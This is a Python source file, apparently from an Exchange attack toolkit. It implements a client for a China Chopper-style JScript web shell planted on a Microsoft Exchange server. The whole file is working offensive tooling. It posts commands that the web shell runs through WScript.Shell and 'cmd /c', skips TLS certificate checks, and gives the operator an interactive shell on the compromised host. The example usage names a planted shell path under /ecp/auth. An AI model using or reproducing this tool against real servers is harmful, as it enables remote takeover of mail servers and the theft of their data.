# ----------------------------------------------------------------------------
# Chopper module.
# Connect to the JScript Web shell and run commands.
# Author: Gabriel Hévr
# ---------------------------------------------------------------------------

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# how many lines to trim from backup file
# may vary in different versions of Exchange
file_lines = 36


class Chopper(object):
    def __init__(self, webshell_path, server_address, password, proxy):
        self.session = requests.Session()
        self.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) " \
                          "Chrome/97.0.4692.71 Safari/537.36 "
        self.proxies = None
        if proxy:
            self.proxies = {"https": proxy}
        self.server_address = server_address
        self.webshell_path = webshell_path
        self.password = password

    def send_command(self, command):
        req = requests.Request("POST", self.server_address+self.webshell_path)
        req.headers["Accept"] = "*/*"
        req.headers["Content-Type"] = "application/x-www-form-urlencoded"
        req.data = f'%s=Response.Write(new ActiveXObject("WScript.Shell").Exec("cmd /c %s").StdOut.ReadAll());' \
                   % (self.password, command)
        response = self.session.send(req.prepare(), verify=False, proxies=self.proxies)
        if "<title>The resource cannot be found.</title>" in response.text:
            raise requests.exceptions.ConnectionError
        return response

    def run(self):
        print("\n\n\n")
        try:
            self.send_command("whoami")
            while True:
                    command = input("$ ")
                    if command == "exit":
                        break
                    else:
                        response = self.send_command(command)
                        print(''.join(response.text.splitlines(keepends=True)[:-file_lines]))
        except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError):
            print("Unable to connect to the target.")
            print("Please check your arguments and make sure the webshell is uploaded.")


if __name__ == "__main__":
    import argparse
    example_usage = "Example: python3 chopper.py -t https://10.0.0.10" \
                    " -x http://127.0.0.1:8080" \
                    " -r /ecp/auth/EvilCorp.aspx" \
                    " -s EvilCorp"

    parser = argparse.ArgumentParser(epilog=example_usage)
    parser.add_argument("-x", "--proxy", help="Proxy to use")
    required_named_args = parser.add_argument_group("Required named arguments")
    required_named_args.add_argument("-t", "--target", help="Exchange Server Address", required=True)
    required_named_args.add_argument("-r", "--request", help="Path to request for chopper", required=True)
    required_named_args.add_argument("-s", "--password", help="Password for chopper", required=True)
    args = parser.parse_args()
    if not args.proxy:
        proxy = None
    else:
        proxy = args.proxy
    chopper = Chopper(args.request, args.target, args.password, proxy)
    chopper.run()